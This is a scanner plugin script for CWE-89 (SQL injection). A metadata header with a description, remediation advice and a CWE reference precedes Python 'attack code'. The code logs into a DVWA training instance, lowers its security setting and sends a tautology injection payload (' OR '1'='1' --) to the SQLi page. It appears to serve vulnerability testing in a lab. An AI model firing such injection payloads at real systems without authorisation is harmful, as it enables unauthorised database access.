#
#CWE 89 Script
#

if(description)
{
  script_id(89);
  script_version("1.0");

  script_name(english:"Improper Neutralization of Special Elements used in an SQL command.");

  script_set_attribute(attribute:"synopsis", value:"Application is vulnerable to SQL injection");
  script_set_attribute(attribute:"description",value:"The product constructs all or part of an SQL command using externally-influenced input from an upstream component, 
but it does not neutralize or incorrectly neutralizes special elements that could modify the intended SQL command when it is sent to a downstream component.");
  script_set_attribute(attribute:"solution", value:"Using prepared statements and white-list SQL quries that can be performed on the database.");
  script_set_attribute(attribute:"risk_factor", value:"High");


  script_set_attribute(attribute:"plugin_publication_date", value: "2023/06/22");
  script_set_attribute(attribute:"plugin_type", value: "Web application");
  script_set_attribute(attribute:"plugin_ref", value: "https://cwe.mitre.org/data/definitions/89.html");
  script_set_attribute(attribute:"cwss", value: "71.1");
  script_set_attribute(attribute:"location", value: "port/80");

  script_end_attributes();

  script_summary(english: "Checks if the web application is vulnerable to SQL injection on the remote host");
  script_category(ACT_ATTACK);

  script_copyright(english: "Copyright(c) 2023");
  script_family(english: "CGI abuses");

  script_timeout(1800);

  exit(0);
}

# Attack code
import re
import requests
import sys
import os

# Get the current file's directory
current_dir = os.path.dirname(os.path.abspath(__file__))

# Create the path to the other folder
other_folder_path = os.path.join(current_dir, '..', '..', 'import_nasl_tools')

# Add the other folder path to sys.path
sys.path.append(other_folder_path)
import get_creds
dvwa_credentials = get_creds.get_dvwa_creds()

def get_login_dvwa(ip_address):
    res_list= []
    payload = {
        'username': dvwa_credentials[0],
        'password': dvwa_credentials[1],
        'Login': 'Login'
    }
    cookies_json = {
        'security': 'low'
    }
    with requests.Session() as c:
        url = 'http://'+ ip_address +'/dvwa/login.php'
        url_vul = 'http://'+ ip_address +'/dvwa/vulnerabilities/sqli'

        r = c.get(url)
        m = re.search(r"user_token'\s*value='(.*?)'", r.text)
        if not m:
            print(f"[CWE89] user_token not found on DVWA login page")
            return []   # or return None, but then handle it in run_script
        token = m.group(1)
        phpsessid = r.cookies.get('PHPSESSID')
        cookies_json['PHPSESSID'] = phpsessid

        payload['user_token'] = token

        p = c.post(url, data=payload, cookies=cookies_json)

        r = c.get(url_vul)
        if r.status_code != 200:
            return
        
        request_url = url_vul + "?id='+OR+'1'%3D'1'+--+&Submit=Submit#"
        p = c.get(request_url)
        res_list.append(p.text)
    return(res_list)

def run_script(target_host):
    res = get_login_dvwa(target_host)
    if len(res) == 0:
        return None
    return res
    
# End of attack code